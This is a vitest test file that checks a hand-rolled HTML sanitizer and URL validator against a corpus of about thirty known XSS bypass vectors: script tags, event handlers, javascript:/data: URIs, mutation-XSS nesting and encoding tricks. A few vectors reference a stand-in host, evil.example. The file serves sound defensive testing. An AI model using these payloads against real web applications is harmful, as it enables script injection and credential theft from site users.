/**
 * F6: DOMPurify-style bypass corpus for the hand-rolled sanitizer.
 *
 * These vectors come from published sanitizer bypasses (HackerOne reports,
 * PortSwigger research, Cure53 XSS vectors). Each payload must be
 * neutralised — the output must contain no executable script or event handler.
 */
import { describe, it, expect } from "vitest";
import { sanitizeHtml, isSafeUrl } from "@/lib/sanitize-html";

/**
 * Assert that sanitised output contains no executable payloads.
 * Checks for: script tags, event handlers (onXxx=), javascript: URIs,
 * data: URIs, and vbscript: URIs.
 */
function assertNoExecutable(output: string): void {
  const lower = output.toLowerCase();
  expect(lower).not.toMatch(/<script[\s>]/i);
  // Check for event handlers as HTML attributes (not inside quoted attr values).
  // Match on\w+= only when preceded by a space (attribute position), not inside
  // a quoted value like title="...onerror=...".
  expect(lower).not.toMatch(/\s+on\w+\s*=\s*"/);
  // Check href/src for dangerous schemes (attribute-level, not inside values)
  expect(lower).not.toMatch(/\bhref\s*=\s*"javascript:/);
  expect(lower).not.toMatch(/\bsrc\s*=\s*"javascript:/);
  expect(lower).not.toMatch(/\bhref\s*=\s*"vbscript:/);
  expect(lower).not.toMatch(/\bsrc\s*=\s*"data:/);
  expect(lower).not.toMatch(/\bhref\s*=\s*"data:/);
}

describe("F6: sanitizer bypass corpus", () => {
  const vectors: Array<{ name: string; input: string }> = [
    // ─── Script injection ───
    {
      name: "basic script tag",
      input: "<script>alert(1)</script>",
    },
    {
      name: "script with src",
      input: '<script src="https://evil.example/xss.js"></script>',
    },
    {
      name: "SVG onload",
      input: '<svg onload="alert(1)">',
    },
    {
      name: "SVG/animate",
      input: '<svg><animate onbegin="alert(1)"></animate></svg>',
    },
    {
      name: "math tag with script",
      input:
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
    },
    // ─── Event handler bypasses ───
    {
      name: "img onerror",
      input: '<img src=x onerror="alert(1)">',
    },
    {
      name: "body onload",
      input: '<body onload="alert(1)">',
    },
    {
      name: "div onmouseover",
      input: '<div onmouseover="alert(1)">hover me</div>',
    },
    {
      name: "input onfocus autofocus",
      input: '<input onfocus="alert(1)" autofocus>',
    },
    {
      name: "details ontoggle",
      input: '<details ontoggle="alert(1)" open><summary>X</summary></details>',
    },
    // ─── Protocol bypasses ───
    {
      name: "javascript: URI in href",
      input: '<a href="javascript:alert(1)">click</a>',
    },
    {
      name: "javascript: with tab bypass",
      input: '<a href="java\tscript:alert(1)">click</a>',
    },
    {
      name: "javascript: with newline bypass",
      input: '<a href="java\nscript:alert(1)">click</a>',
    },
    {
      name: "javascript: with encoded entities",
      input:
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
    },
    {
      name: "data: URI with base64 SVG",
      input: '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
    },
    {
      name: "data: URI in href",
      input: '<a href="data:text/html,<script>alert(1)</script>">click</a>',
    },
    {
      name: "vbscript: URI",
      input: '<a href="vbscript:MsgBox(1)">click</a>',
    },
    // ─── Encoding and whitespace tricks ───
    {
      name: "null byte in tag",
      input: "<scr\0ipt>alert(1)</scr\0ipt>",
    },
    {
      name: "mixed case script",
      input: "<ScRiPt>alert(1)</sCrIpT>",
    },
    {
      name: "backtick in attribute",
      input: "<img src=`javascript:alert(1)`>",
    },
    {
      name: "protocol-relative URL",
      input: '<a href="//evil.example/xss">click</a>',
    },
    // ─── CSS injection ───
    {
      name: "style tag",
      input: '<style>body{background:url("javascript:alert(1)")}</style>',
    },
    {
      name: "style attribute",
      input: '<div style="background:url(javascript:alert(1))">content</div>',
    },
    // ─── iframe/object ───
    {
      name: "iframe injection",
      input: '<iframe src="javascript:alert(1)"></iframe>',
    },
    {
      name: "object tag",
      input: '<object data="javascript:alert(1)"></object>',
    },
    {
      name: "embed tag",
      input: '<embed src="javascript:alert(1)">',
    },
    // ─── Entity and comment bypasses ───
    {
      name: "HTML comment breakout",
      input: "<!--><script>alert(1)</script>-->",
    },
    {
      name: "double-encoded entities",
      input: "<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>",
    },
    {
      name: "mutation XSS (mXSS) nesting",
      input: "<p><b><noscript><!--</noscript><img src=x onerror=alert(1)>--></noscript></b></p>",
    },
    // ─── Form hijacking ───
    {
      name: "form action injection",
      input: '<form action="https://evil.example"><input type=submit value="Login"></form>',
    },
    // ─── Template literals ───
    {
      name: "template tag",
      input: "<template><script>alert(1)</script></template>",
    },
    // ─── Meta refresh ───
    {
      name: "meta refresh redirect",
      input: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    },
  ];

  for (const { name, input } of vectors) {
    it(`neutralises: ${name}`, () => {
      const output = sanitizeHtml(input);
      assertNoExecutable(output);
    });
  }
});

describe("F6: isSafeUrl bypass corpus", () => {
  const unsafeUrls = [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "java\rscript:alert(1)",
    "\x01javascript:alert(1)",
    " \t javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
    "vbscript:MsgBox(1)",
    "//evil.example/xss",
    "blob:https://evil.example/uuid",
    "filesystem:https://evil.example/path",
  ];

  for (const url of unsafeUrls) {
    it(`rejects unsafe URL: ${JSON.stringify(url)}`, () => {
      expect(isSafeUrl(url)).toBe(false);
    });
  }

  const safeUrls = [
    "https://example.com",
    "http://example.com/path",
    "/relative/path",
    "#anchor",
    "relative/path.html",
    "../parent/path",
  ];

  for (const url of safeUrls) {
    it(`accepts safe URL: ${url}`, () => {
      expect(isSafeUrl(url)).toBe(true);
    });
  }
});
